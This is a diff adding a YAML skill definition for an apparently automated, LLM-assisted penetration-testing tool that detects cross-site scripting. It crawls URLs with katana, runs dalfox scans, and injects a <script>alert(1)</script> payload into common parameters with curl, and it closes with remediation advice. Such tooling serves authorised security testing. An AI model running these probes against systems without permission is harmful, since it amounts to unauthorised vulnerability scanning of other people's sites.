@@ -1,0 +1,93 @@
+skill_id: xss_detection
+name: "XSS (Cross-Site Scripting) Detection"
+category: web_inject
+version: "1.0"
+
+principle: |
+  XSS vulnerabilities allow injecting client-side scripts into web pages.
+  dalfox provides automated reflected/stored XSS detection with DOM analysis.
+  Combined with katana for URL discovery and parameter extraction.
+
+match:
+  rules:
+    - evidence_contains: ["xss"]
+    - evidence_contains: ["cross-site scripting"]
+    - evidence_contains: ["reflected"]
+    - fingerprint_contains: ["php"]
+      evidence_contains: ["parameter"]
+    - fingerprint_contains: ["asp"]
+      evidence_contains: ["parameter"]
+
+probes:
+  - id: crawl_urls
+    description: "Crawl target for URLs with parameters"
+    command: |
+      BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+      echo "=== URL Crawling ==="
+      katana -u "$BASE" -d 2 -silent -jc 2>/dev/null | grep "?" | head -30
+      echo "CRAWL_DONE"
+    timeout: 60
+    parse_rules:
+      - if_contains: ["?"]
+        set: { urls_with_params: true }
+
+exploit_paths:
+  - path_id: dalfox_scan
+    name: "dalfox Automated XSS Scan"
+    priority: 1
+    steps:
+      - id: dalfox_test
+        description: "dalfox XSS detection on target"
+        command: |
+          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+          echo "=== DalFox XSS Scan ==="
+          echo "$BASE" | dalfox pipe --silence --only-poc 2>/dev/null | head -20
+          echo "DALFOX_DONE"
+        timeout: 120
+        success_criteria:
+          stdout_contains_any: ["[POC]", "[V]", "Verified"]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "xss"
+
+  - path_id: manual_xss
+    name: "Manual XSS Parameter Testing"
+    priority: 2
+    conditions:
+      urls_with_params: true
+    steps:
+      - id: param_test
+        description: "Test common parameters for XSS"
+        command: |
+          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+          echo "=== Manual XSS Test ==="
+          PAYLOAD='<script>alert(1)</script>'
+          ENCODED='%3Cscript%3Ealert(1)%3C%2Fscript%3E'
+          for param in q search query name id msg message comment text input; do
+            result=$(curl -s "$BASE/?$param=$ENCODED" --max-time 8 2>/dev/null)
+            if echo "$result" | grep -q "$PAYLOAD"; then
+              echo "XSS_REFLECTED:$param"
+              exit 0
+            fi
+          done
+          echo "XSS_NOT_FOUND"
+        timeout: 60
+        success_criteria:
+          stdout_contains_any: ["XSS_REFLECTED"]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "xss_reflected"
+
+  - path_id: llm_freeform
+    name: "LLM freeform reasoning"
+    priority: 99
+    mode: react_freeform
+    max_rounds: 5
+
+remediation: |
+  1. Implement input validation and output encoding
+  2. Use Content-Security-Policy headers
+  3. Use HttpOnly and Secure cookie flags
+  4. Sanitize user input with established libraries
